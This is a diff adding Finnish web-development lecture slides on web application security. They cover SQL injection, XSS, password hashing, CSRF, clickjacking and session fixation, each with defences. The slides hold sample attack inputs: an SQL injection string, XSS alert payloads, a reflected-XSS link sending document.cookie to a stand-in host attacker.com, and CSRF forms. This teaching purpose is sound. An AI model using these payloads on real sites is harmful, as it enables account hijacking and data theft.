@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+		<meta charset="utf-8">
+    <title>tietoturva</title>
+    
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+		<link href="../../assets/css/bootstrap.min.css" rel="stylesheet">
+		<!--[if lt IE 9]>
+			<script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+		<![endif]-->
+    <link href='http://fonts.googleapis.com/css?family=Bree+Serif' rel='stylesheet' type='text/css'>
+		<link href="../../assets/css/slides-onepage.css" rel="stylesheet">
+	 		<link href="../../assets/css/slides.css" rel="stylesheet">
+	<link href="../../assets/css/tamplr.css" rel="stylesheet">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">
+	</head>
+	<body>
+    <div class="container">
+      <div class="row">
+        <div class="col-md-12">
+          <h1 id="tietoturva">Tietoturva</h1>
+<p><a href="./">Kalvot</a></p>
+<hr>
+<h2 id="tietoturva">Tietoturva</h2>
+<ul>
+<li><p>Webissä voi tietoturva olla pielessä monin eri tavoin</p>
+<ul>
+<li>Selaimen ja palvelimen välissä on joku nuuskimassa</li>
+<li>Selaimessa on korjaamaton tietoturvaongelma</li>
+<li>Selaimen liitännäisessä on tietoturvaongelma</li>
+<li>Käyttäjän salasana on joutunut vääriin käsiin</li>
+<li>Palvelinohjelmistossa on tietoturva-aukko</li>
+<li>Web-sovelluksessa on tietoturva-aukko</li>
+<li>...</li>
+</ul>
+</li>
+<li><p>Tänään keskitytään siihen, miten web-sovelluksen kehittäjä voi välttää
+yleisimpiä tietoturvaongelmia</p>
+</li>
+</ul>
+<ul>
+<li>Kalvosetti perustuu osittain lähteeseen
+<a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">OWASP Top Ten Project 2013</a><ul>
+<li>&quot;The OWASP Top Ten represents a broad consensus about what the most critical web application security flaws are.&quot;</li>
+</ul>
+</li>
+</ul>
+<p><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons -lisenssi" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a></p>
+<hr>
+<h2 id="injektiohy-kk-ykset">Injektiohyökkäykset</h2>
+<ul>
+<li><p>Injektiohyökkäykset perustuvat virheisiin käyttäjän syöttämän tiedon
+käsittelyssä</p>
+</li>
+<li><p>Hyökkääjän tavoitteena on</p>
+<ul>
+<li>saada oma syöte tulkituksi osaksi ohjelmaa, ja</li>
+<li>näin muuttaa ohjelman toimintaa</li>
+</ul>
+</li>
+<li><p>Injektiohyökkäys kohdistuu aina tiettyyn järjestelmän osaan</p>
+<ul>
+<li>SQL-injektio</li>
+<li>NoSQL-injektio</li>
+<li>Cross-site Scripting (HTML + JavaScript)</li>
+<li>...</li>
+</ul>
+</li>
+<li><p>Samoin hyökkäyksen estäminen, syötteen ja ulostulon käsittely riippuu
+kohdealueesta</p>
+</li>
+</ul>
+<hr>
+<h2 id="sql-injektio">SQL-injektio</h2>
+<ul>
+<li><p>SQL-injektiot olivat pitkään tavanomaisimpia hyökkäyksiä web-palveluja
+vastaan</p>
+</li>
+<li><p>Idea on hyökätä palveluun, joka käyttää SQL-lausekkeiden koostamiseen
+käyttäjän syötteitä</p>
+<ul>
+<li>Arvataan miten lauseke voidaan koostaa ja muodostetaan syötteet
+niin, että saadaan aikaan haluttu toiminnallisuus</li>
+</ul>
+</li>
+</ul>
+<pre><code class="hljs sql">var q = "<span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">name</span> = <span class="hljs-string">'" + name + "'</span>;</span>";
+teeTietokantakysely(q);</code></pre>
+
+<p>Hyökkääjä syöttää käyttäjätunnuksen:</p>
+<pre><code class="hljs">' <span class="hljs-keyword">or</span> <span class="hljs-attribute">'x</span>' = <span class="hljs-attribute">'x</span></code></pre>
+
+<p>jolloin kysely hakee kaikki käyttäjät:</p>
+<pre><code class="hljs sql"><span class="hljs-operator"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">name</span>=<span class="hljs-string">''</span> <span class="hljs-keyword">or</span> <span class="hljs-string">'x'</span> = <span class="hljs-string">'x'</span>;</span></code></pre>
+
+<hr>
+<h2 id="-xkcd-com-327-http-xkcd-com-327-"><a href="http://xkcd.com/327/">xkcd.com/327</a></h2>
+<p><img src="http://imgs.xkcd.com/comics/exploits_of_a_mom.png" alt=""></p>
+<hr>
+<h2 id="sql-injektiolta-suojautuminen">SQL-injektiolta suojautuminen</h2>
+<ul>
+<li><p>Injektiolta voidaan suojautua käsittelemällä kaikki
+epäluotettavasta lähteestä (mm. käyttäjä) tuleva tieto tarkkaan</p>
+</li>
+<li><p>Helpointa on käyttää jotain kirjastoa, joka hoitaa käsittelyn</p>
+<ul>
+<li>esim. Sequelize kun käytetään rajapintafunktioita kuten <code>Model.find()</code></li>
+</ul>
+</li>
+<li><p>Jos SQL-lauseita täytyy muodostaa käsin, on ainakin kaksi vaihtoehtoa:</p>
+<ol>
+<li><em>escape</em>: muunnetaan syötteen erikoismerkit sellaisiksi, että niitä ei voida
+tulkita kielen rakenteiksi<ul>
+<li>Esim. <code>&#39;</code> -&gt; <code>\&#39;</code> jne.</li>
+</ul>
+</li>
+<li><em>whitelist</em>: vain tietynlaiset syötteet sallitaan<ul>
+<li>Esim. käyttäjätunnus saa sisältää vain kirjaimia ja numeroita</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p>Samat periaatteet pätevät muihinkin injektiohyökkäyksiin</p>
+</li>
+</ul>
+<hr>
+<h2 id="cross-site-scripting-xss-">Cross-site Scripting (XSS)</h2>
+<ul>
+<li><p>Cross-site Scripting (XSS) on hyökkäys, jossa ujutetaan ohjelmakoodia
+(JavaScript) HTML-dokumentin sekaan, jolloin selain suorittaa sen</p>
+<ul>
+<li>Eräänlainen injektio siis tämäkin</li>
+</ul>
+</li>
+<li><p>Koodi ajetaan selaimen näkökulmasta kohdepalvelun kontekstissa</p>
+<ul>
+<li>Selain tulkitsee koodin olevan peräisin samasta <em>originista</em> kuin
+kohdepalvelu</li>
+<li>Tällöin hyökkääjän koodi voi mm. tehdä Ajax-kutsuja
+kohdepalveluun, käsitellä evästeitä, muokata sivua, jne.</li>
+</ul>
+</li>
+<li><p>XSS-hyökkäykset voidaan jakaa</p>
+<ul>
+<li>pysyviin (persistent)</li>
+<li>ei-pysyviin</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="pysyv-xss">Pysyvä XSS</h2>
+<ul>
+<li><p>Pysyvässä XSS-hyökkäyksessä hyökkääjä</p>
+<ul>
+<li>tallentaa web-sovelluksen tietokantaan koodin, jonka haluaa
+injektoida</li>
+<li>ja järjestää niin, että ko. koodi suoritetaan käyttäjän
+selaimessa</li>
+</ul>
+</li>
+<li><p>Esimerkiksi jos keskustelupalsta ei ole suojautunut XSS-hyökkäyksiä
+vastaan voisi hyökkääjä kirjoittaa viestin
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">&quot;böö&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span></code></pre>
+jolloin se tallentuu palvelimelle ja skripti suoritetaan aina kun joku käyttäjä lataa viestin selaimellaan</p>
+</li>
+</ul>
+<hr>
+<h2 id="ei-pysyv-xss">Ei-pysyvä XSS</h2>
+<ul>
+<li><p>Ei-pysyvässä XSS-hyökkäyksessä koodi ei tallennu pysyvästi
+tietokantaan</p>
+</li>
+<li><p>Hyökkääjä käyttää hyväkseen jotain sellaista syötettä</p>
+<ul>
+<li>jota palvelin käyttää sivun luontiin</li>
+<li>jonka käsittely (erikoismerkit) ei toimi, jolloin</li>
+<li>tulossivuun päästään lisäämään haluttu koodi</li>
+</ul>
+</li>
+<li><p>Esimerkiksi, sivuston hauissa käytetään query-parametria <code>q</code>, jota ei
+tarkisteta kunnolla, mutta käytetään sivun generoinnissa. Hyökkääjä voi nyt jakaa seuraavan linkin uhrilleen:</p>
+</li>
+</ul>
+<pre><code class="hljs html">http://example.com/search.php?
+q=<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=
+<span class="hljs-string">'http://attacker.com/cookiesteal?'</span>
++<span class="hljs-built_in">document</span>.cookie</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span></code></pre>
+
+<hr>
+<h2 id="ei-pysyv-dom-pohjainen-xss">Ei-pysyvä, DOM-pohjainen XSS</h2>
+<ul>
+<li><p>Myös selainpään DOM-manipulointi voi olla altis XSS-hyökkäyksille</p>
+</li>
+<li><p>Esim. sivu osoitteessa <code>example.com</code> lukee käyttäjän nimen URL-parametrista ja lisää sen
+DOM:iin</p>
+</li>
+</ul>
+<pre><code class="hljs javascript"><span class="hljs-keyword">var</span> pos = <span class="hljs-built_in">document</span>.URL.indexOf(<span class="hljs-string">"name="</span>);
+<span class="hljs-keyword">var</span> name = <span class="hljs-built_in">decodeURIComponent</span>(<span class="hljs-built_in">document</span>.URL.substr(pos+<span class="hljs-number">5</span>));
+<span class="hljs-built_in">document</span>.write(name);</code></pre>
+
+<p>Hyökkääjä voi antaa uhrilleen seuraavan URL:n</p>
+<pre><code class="hljs http">http://example.com/?name=&lt;script&gt;alert("böö");&lt;/script&gt;</code></pre>
+
+<hr>
+<h2 id="xss-lt-suojautuminen">XSS:ltä suojautuminen</h2>
+<ul>
+<li><p>XSS:ltä suojautuakseen täytyy huomata, että eri HTML-dokumentin osat
+noudattavat erilaisia jäsennyssääntöjä</p>
+<ul>
+<li>Myös niihin lisättävää epäluotettavaa dataa on kohdeltava eri
+tavoin</li>
+</ul>
+</li>
+<li><p>Tavallisin tapaus: epäluotettavan datan lisääminen elementin sisään (<code>&lt;body&gt;</code>,
+<code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>, ...):</p>
+<ul>
+<li>Riittää
+<a href="http://www.w3schools.com/html/html_entities.asp">&quot;entity-enkoodata&quot;</a> merkit <code>&amp;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&quot;</code>, <code>&#39;</code>, <code>/</code></li>
+<li>Esim. <code>&amp;</code> muotoon <code>&amp;amp;amp;</code> ja <code>&lt;</code> muotoon <code>&amp;amp;lt;</code> jne.</li>
+<li>EJS-sivupohjamoottorin <code>&lt;%= muuttuja %&gt;</code> tekee tämän</li>
+</ul>
+</li>
+<li><p>Attribuutit, esim <code>&lt;div class=&quot;&lt;%= luokka %&gt;&quot;&gt;</code></p>
+<ul>
+<li>Jos attribuutit on aina ympäröity lainausmerkein, riittää
+enkoodata <code>&quot;</code></li>
+<li>Jos ei, täytyy enkoodata <a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#RULE_.232_-_Attribute_Escape_Before_Inserting_Untrusted_Data_into_HTML_Common_Attributes">paljon muutakin</a></li>
+<li>Erikoisattribuutit <code>href</code>, <code>src</code>, <code>style</code> ja tapahtumankäsittelijät (esim. <code>onmouseover</code>)
+ovat vaikeampia</li>
+</ul>
+</li>
+<li><p><a href="https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet">XSS Prevention Cheat Sheet</a>
+kertoo tarkemmin</p>
+</li>
+</ul>
+<hr>
+<h2 id="salasanojen-tallentaminen">Salasanojen tallentaminen</h2>
+<ul>
+<li><p>Tietovuodon aiheuttamia vahinkoja voi pienentää salakirjoittamalla
+tietokantaan tallennettu sensitiivinen data</p>
+</li>
+<li><p>Mikäli mahdollista kannattaa käyttää yksisuuntaista
+tiivistefunktiota (hash function)</p>
+<ul>
+<li>Mm. salasanojen tapauksessa näin kannattaa ~aina tehdä</li>
+<li>Tällöin web-sovelluksen ylläpitäjäkään ei voi saada selville
+käyttäjien salasanoja</li>
+</ul>
+</li>
+<li><p>Toiminta:</p>
+<ol>
+<li>Tallennetaan selväkielisen salasanan sijaan sen <em>tiiviste</em> (<em>hash</em>)</li>
+<li>Aina salasanaa tarkastettaessa lasketaan tiiviste<ul>
+<li>ja verrataan tätä tietokantaan tallennettuun tiivisteeseen</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<hr>
+<h2 id="salasanojen-tallentaminen">Salasanojen tallentaminen</h2>
+<p><img src="../img/hashpass.png" alt=""></p>
+<hr>
+<h2 id="tiivistefunktio">Tiivistefunktio</h2>
+<ul>
+<li><p>Tiivistefunktion on oltava sellainen, että</p>
+<ul>
+<li>tiivisteestä ei saa selville alkuperäistä syötettä<ul>
+<li>muuta kuin <em>brute force</em> -metodilla joka kestää astronomisen
+kauan</li>
+</ul>
+</li>
+<li><em>törmäyksiä</em> (<em>hash collision</em>) ei tapahdu<ul>
+<li>törmäys = kaksi eri syötettä tuottaa saman tiivisteen</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Esimerkiksi <em>SHA256</em>-funktio täyttää nämä ehdot</p>
+<ul>
+<li>(Luultavasti. Ei ole olemassa tiivistefunktiota joka
+<em>todistetusti</em> täyttäisi ehdot.)</li>
+</ul>
+</li>
+</ul>
+<pre><code class="hljs javascript"><span class="hljs-keyword">var</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);
+<span class="hljs-keyword">var</span> sha256 = crypto.createHash(<span class="hljs-string">'sha256'</span>);
+sha256.update(<span class="hljs-string">'salasana'</span>).digest(<span class="hljs-string">'base64'</span>);</code></pre>
+
+<h2 id="-pre-code-class-hljs-javascript-span-class-hljs-string-b1pcggh-sys0resomv7iyfmknfvlw87w0kdlqhkuuhw-span-code-pre-"><pre><code class="hljs javascript"><span class="hljs-string">&#39;B1pCGgH+SYS0reSomv7IYfmkNfVLW87W0KDlqHkuUhw=&#39;</span></code></pre></h2>
+<h2 id="sanakirjahy-kk-ys">Sanakirjahyökkäys</h2>
+<ul>
+<li><p>Tiivistealgoritmit ovat deterministisiä</p>
+<ul>
+<li>Sama salasana tuottaa aina saman tiivisteen</li>
+</ul>
+</li>
+<li><p>Vuodetuista salasanojen tiivisteistä on helppo saada yleisimmät salasanat selville ns.  <em>sanakirjahyökkäyksellä</em></p>
+<ul>
+<li>Sanakirjahyökkäyksessä lasketaan yleisempien salasanojen (esim.
+kaikki suomen tai englannin sanat) tiivisteet</li>
+<li>ja katsotaan löytyykö näitä tiivisteitä vuodetusta salasanatietokannasta</li>
+</ul>
+</li>
+<li><p>Tiivisteet voidaan laskea ennakkoon</p>
+<ul>
+<li>Tähän tarkoitukseen käytetään usein
+<a href="http://kestas.kuliukas.com/RainbowTables/"><em>rainbow table</em></a>
+-tietorakennetta<ul>
+<li>Paljon salasana-tiiviste-pareja voidaan tallentaa tiiviisti</li>
+<li>Ns. rainbow table attack</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Sanakirjahyökkäys voidaan estää lisäämällä salasanaan suola, salt -&gt;</p>
+</li>
+</ul>
+<hr>
+<h2 id="salasanojen-tallentaminen-suola">Salasanojen tallentaminen: suola</h2>
+<ul>
+<li><p>Sanakirjahyökkäys voidaan estää lisäämällä salasanaan <em>suola</em>, <em>salt</em></p>
+</li>
+<li><p>Suola on satunnainen merkkijono, joka luodaan salasanan luonnin yhteydessä</p>
+</li>
+<li><p>Suola lisätään salasanaan aina tiivistettä laskettaessa</p>
+</li>
+</ul>
+<pre><code>H = <span class="hljs-function"><span class="hljs-title">Hash</span><span class="hljs-params">(password + salt)</span></span></code></pre>
+
+<ul>
+<li>Kuhunkin tiivisteeseen liittyvä suola on myös tallennettava tietokantaan<ul>
+<li>Tarvitaan salasanaa tarkastettaessa</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="salasanojen-tallentaminen-suola">Salasanojen tallentaminen: suola</h2>
+<p><img src="../img/hashpasssalt.png" alt=""></p>
+<hr>
+<h2 id="scrypt">Scrypt</h2>
+<ul>
+<li><p>Helpoiten salasanojen turvallinen tallentaminen onnistunee käyttäen
+jotain <a href="http://en.wikipedia.org/wiki/Key_derivation_function">key derivation -funktiota</a>,
+joka laskee tiivisteen ja lisää suolan automaattisesti</p>
+<ul>
+<li>Esim. <a href="http://en.wikipedia.org/wiki/Scrypt">Scrypt</a></li>
+</ul>
+</li>
+<li><p>Node.js:ssä voi käyttää pakettia <a href="https://github.com/barrysteyn/node-scrypt">scrypt</a></p>
+</li>
+</ul>
+<pre><code class="hljs javascript"><span class="hljs-keyword">var</span> scrypt = <span class="hljs-built_in">require</span>(<span class="hljs-string">'scrypt'</span>);
+
+scrypt.hash.config.keyEncoding = <span class="hljs-string">'utf8'</span>;
+scrypt.hash.config.outputEncoding = <span class="hljs-string">'base64'</span>;
+scrypt.verify.config.keyEncoding = <span class="hljs-string">'utf8'</span>;
+scrypt.verify.config.hashEncoding = <span class="hljs-string">'base64'</span>;
+
+<span class="hljs-keyword">var</span> h = scrypt.hash(<span class="hljs-string">'SaLa123'</span>, scrypt.params(<span class="hljs-number">0.1</span>));
+
+<span class="hljs-built_in">console</span>.log(<span class="hljs-string">"Hash: "</span> + h);
+
+scrypt.verify(h, <span class="hljs-string">'SaLa123'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, result</span>) </span>{
+  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"Salasana oikein? - "</span> + result);
+});</code></pre>
+
+<hr>
+<h2 id="cross-site-request-forgery-csrf-">Cross-site Request Forgery (CSRF)</h2>
+<ul>
+<li><p>CSRF-hyökkäyksessä hyökkääjä saa uhrin selaimen lähettämään
+HTTP-pyynnön hyökkääjän haluamaan kohdepalveluun</p>
+</li>
+<li><p>Hyökkäys käyttää hyväkseen selaimen ja kohdepalvelun välistä
+tilatietoa</p>
+<ul>
+<li>Esim. evästeessä oleva istuntotunniste, joka lähetetään pyynnön
+mukana</li>
+</ul>
+</li>
+<li><p>Hyökkäys perustuu pyynnön sivuvaikutuksiin</p>
+<ul>
+<li>Hyökkääjä ei (yleensä) näe pyynnön vastausta</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="csrf-esimerkki-1">CSRF-esimerkki 1</h2>
+<ul>
+<li>Osoitteessa <code>http://pahis.org</code> on seuraava HTML:</li>
+</ul>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-title">img</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">"https://pankki.fi/tyhjennaTili"</span> <span class="hljs-attribute">alt</span>=<span class="hljs-value">"kuva"</span> /&gt;</span></code></pre>
+
+<ul>
+<li><p>Kuvaa ladatessaan käyttäjän selain tekee HTTP GET-pyynnön kohteeseen <code>pankki.fi</code></p>
+<ul>
+<li>Mukana kulkee myös mahdolliset <code>pankki.fi</code>-sivuston evästeet,
+mm. istuntotunniste</li>
+</ul>
+</li>
+<li><p>Jos GET-pyynnöllä on sivuvaikutuksia, suoritetaan ne palvelimella</p>
+</li>
+<li><p>Oikein toteutetulla GET-pyynnön käsittelyllähän ei pitäisi olla
+sivuvaikutuksia, jolloin tämä hyökkäys ei toimi!</p>
+</li>
+</ul>
+<hr>
+<h2 id="csrf-esimerkki-2">CSRF-esimerkki 2</h2>
+<ul>
+<li>Osoitteessa <code>http://pahis.org</code> on seuraava lomake, joka käyttäjä
+huijataan lähettämään</li>
+</ul>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">action</span>=<span class="hljs-value">"https://pankki.fi/tyhjennaTili"</span> <span class="hljs-attribute">method</span>=<span class="hljs-value">"POST"</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"submit"</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">"Katso kissavideo"</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span></code></pre>
+
+<ul>
+<li><p><code>POST</code>-pyynnöllä voi olla sivuvaikutuksia, joten tältä suojautumiseen
+pelkkä HTTP-protokollan noudattaminen ei riitä</p>
+</li>
+<li><p><code>PUT</code>, <code>DELETE</code> tai monimutkaisempia <code>POST</code>-pyyntöjä toisiin
+<em>origineihin</em> ei oletuksena tehdä suoraan vaan tarvitaan
+  <a href="../asiakaspalvelin/#26">preflight-vaihe</a></p>
+<ul>
+<li>Tällöin ei CSRF myöskään onnistu</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="csrf-lt-suojautuminen">CSRF:ltä suojautuminen</h2>
+<ul>
+<li><p>CSRF:n kannalta oleellisia ovat pyynnöt...</p>
+<ol>
+<li>joilla on sivuvaikutuksia</li>
+<li>ja joita voidaan tehdä muista origineista</li>
+</ol>
+</li>
+<li><p>CSRF voidaan estää vaatimalla pyynnössä salainen merkkijono,
+<em>CSRF token</em>, esimerkiksi HTTP-viestin rungossa</p>
+<ul>
+<li>CSRF token annetaan niille tahoille, joilla on oikeus tehdä pyyntö</li>
+<li>Esim. generoitavan HTML-sivun lomakkeen piilotetussa kentässä<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">...</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"hidden"</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">"_csrf"</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">"fj93jf89fjaw89f"</span>&gt;</span>
+...
+<span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span></code></pre>
+</li>
+</ul>
+</li>
+<li><p>Toinen tapa on tarkastella <code>Referer</code> HTTP-otsikkokenttää</p>
+<ul>
+<li>Ei ihan yhtä hyvä tapa: sivustolla X voi olla haavoittuvuus, jolla
+hyökkääjä pystyy luomaan uudelleenohjauksen, jolloin
+<code>Referer: X</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="csrf-lt-suojautuminen-node-js">CSRF:ltä suojautuminen: Node.js</h2>
+<ul>
+<li><p>Node.js + Expressin kanssa voidaan käyttää vaikkapa pakettia
+<a href="https://github.com/expressjs/csurf"><code>csurf</code></a></p>
+</li>
+<li><p>Middleware generoi ja tarkistaa CSRF tokenin</p>
+</li>
+</ul>
+<pre><code class="hljs javascript"><span class="hljs-keyword">var</span> csrf = <span class="hljs-built_in">require</span>(<span class="hljs-string">'csurf'</span>);
+...
+<span class="hljs-keyword">var</span> csrfProtection = csrf();
+app.get(<span class="hljs-string">'/'</span>, csrfProtection, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req,res</span>) </span>{
+  res.render(<span class="hljs-string">'etusivu'</span>, {csrfToken: req.csrfToken()});
+} );
+app.post(<span class="hljs-string">'/tyhjennaTili'</span>, csrfProtection, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>{
+  ...
+});</code></pre>
+
+<ul>
+<li>etusivu.ejs</li>
+</ul>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">action</span>=<span class="hljs-value">"/tyhjennaTili"</span> <span class="hljs-attribute">method</span>=<span class="hljs-value">"post"</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"hidden"</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">"_csrf"</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">"&lt;%= csrfToken %&gt;"</span>/&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"submit"</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">"Tyhjennä tili"</span>/&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span></code></pre>
+
+<hr>
+<h2 id="clickjacking">Clickjacking</h2>
+<ul>
+<li><p><em>Clickjacking</em> (<em>UI redressing</em>) -hyökkäyksessä hyökkääjä luo
+sivuston, jonka käyttöliittymä hämää käyttäjän tekemään (usein
+klikkaamaan) jossain toisessa web-sivustossa jotain jota hänen ei ollut
+tarkoitus</p>
+</li>
+<li><p>Esim. hyökkääjä haluaa sivulleen Facebook-tykkäyksiä</p>
+<ul>
+<li>Hyökkääjä luo kiltin näköisen sivun</li>
+<li>Lisää sinne Facebook-tykkäysnapin</li>
+<li>Luo tykkäysnapin päälle HTML-elementin<ul>
+<li>esim. videon play-painike</li>
+</ul>
+</li>
+<li>Käyttäjä luulee klikkaavansa play-painiketta, mutta oikeasti
+klikkaus kohdistuu tykkäysnappiin</li>
+</ul>
+</li>
+<li><p>Paljon erilaisia variaatioita: tykkäysnappi voidaan tehdä
+näkymättömäksi, liikuttaa automaattisesti kursorin mukana, jne.</p>
+</li>
+<li><p>Usein hyökkäys toteutetaan upottamalla klikkauksen kohde <code>&lt;iframe&gt;</code>-elementin sisään</p>
+<ul>
+<li>Oletuksena minkä tahansa sivuston voi lisätä <code>&lt;iframe&gt;</code>:een</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="clickjackingilta-suojautuminen">Clickjackingilta suojautuminen</h2>
+<ul>
+<li><p>Perustapauksessa voidaan kieltää sivuston näyttäminen
+<code>&lt;iframe&gt;</code>-elementissä</p>
+<ul>
+<li>Onnistuu <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options"><code>X-Frame-Options</code></a> -HTTP-otsikolla, esim.<pre><code class="hljs http"><span class="hljs-attribute">X-Frame-Options</span>: <span class="hljs-string">DENY</span></code></pre></li>
+<li>Nykyään suositeltavin tapa lienee käyttää
+<a href="https://developer.mozilla.org/en-US/docs/Web/Security/CSP"><code>Content-Security-Policy</code></a>-otsikon
+<a href="https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives#frame-ancestors"><code>frame-ancestors</code></a>-direktiiviä, esim.<pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span>: <span class="hljs-string">frame-ancestors</span></code></pre>
+</li>
+</ul>
+</li>
+<li><p>Jos halutaan sallia sivuston liittäminen osaksi mitä tahansa muuta
+sivustoa (esim. tykkäysnappi), clickjackingin estäminen menee huomattavasti
+hankalammaksi...</p>
+<ul>
+<li>Yksi tapa on avata klikkauksen jälkeen uusi selainikkuna,
+jossa kysytään vahvistus käyttäjältä</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="session-fixation">Session Fixation</h2>
+<ul>
+<li><p><a href="https://www.owasp.org/index.php/Session_fixation">Session fixation</a> -hyökkäyksessä
+hyökkääjä houkuttelee uhrin käyttämään hyökkääjän tuntemaa istuntotunnistetta</p>
+</li>
+<li><p>Esim.</p>
+<ol>
+<li>Hyökkääjä luo kohdepalvelussa istuntotunnisteen</li>
+<li>Hyökkääjä saa uhrin käyttämään tätä istuntotunnistetta<ul>
+<li>Esim 1. antamalla tälle linkin
+<code>http://example.com/?SID=HYOKKAAJAN_SID</code></li>
+<li>Esim 2. <code>pahis.herokuapp.com</code> saa asettaa evästeen domainille
+<code>herokuapp.com</code>, jolloin se (SID=HYOKKAAJAN_SID) lähetetään
+myös domainiin <code>kohdepalvelu.herokuapp.com</code></li>
+</ul>
+</li>
+<li>Uhri kirjautuu sisään käyttäen hyökkääjän antamaa
+istuntotunnistetta</li>
+<li>Nyt hyökkäjä voi ottaa haltuunsa uhrin istunnon</li>
+</ol>
+</li>
+<li><p>Estäminen: luodaan uusi istuntotunniste käyttäjän kirjautuessa</p>
+<ul>
+<li>Express: <code>req.session.regenerate(function(err) {})</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="owasp-top-ten-a1-a4-">OWASP Top Ten (A1-A4)</h2>
+<p><a href="http://owasptop10.googlecode.com/files/OWASP%20Top%2010%20-%202013.pdf">OWASPTop10</a>:
+merkittävimmät web-sovellusten tietoturvaongelmat</p>
+<ul>
+<li><p>A1:  Injection</p>
+</li>
+<li><p>A2: Broken Authentication and Session Management</p>
+<ul>
+<li>Autentikointi- tai istuntotiedot (salasana, istuntotunniste, ...)
+päätyvät vääriin käsiin</li>
+<li>Syitä voi olla monia. Esim. salaamaton HTTP-yhteys, <em>session fixation</em>, ...</li>
+</ul>
+</li>
+<li><p>A3: Cross-Site Scripting (XSS)</p>
+</li>
+<li><p>A4: Insecure Direct Object References</p>
+<ul>
+<li>Suorat, autentikoimattomat viittaukset olioihin</li>
+<li>Esim. Teemun salaiset tiedot saa osoitteesta
+<code>https://example.com/teemu/tiedot</code><ul>
+<li>Hyökkääjän helppo arvata, että Ahton tiedot saa osoitteesta
+<code>https://example.com/ahto/tiedot</code></li>
+</ul>
+</li>
+<li>Estäminen: <em>Jokaisen</em> resurssin autentikointi pitää olla kunnossa</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="owasp-top-ten-a5-a6-">OWASP Top Ten (A5-A6)</h2>
+<ul>
+<li><p>A5: Security Misconfiguration</p>
+<ul>
+<li>Palvelimella on konfiguraatiosta johtuva tietoturva-aukko</li>
+<li>Estäminen: kaikki ohjelmiston osat konfiguroitu oikein<ul>
+<li>Ei oletussalasanoja, turvattomia oletusasetuksia, stack
+traceja näkyville, jne.</li>
+<li>Sama konfiguraatio kehitys-, QA- ja tuotantoympäristössä</li>
+<li>Prosessi, joka mahdollistaa tietoturvakorjausten julkaisemisen
+nopeasti</li>
+</ul>
+</li>
+</ul>
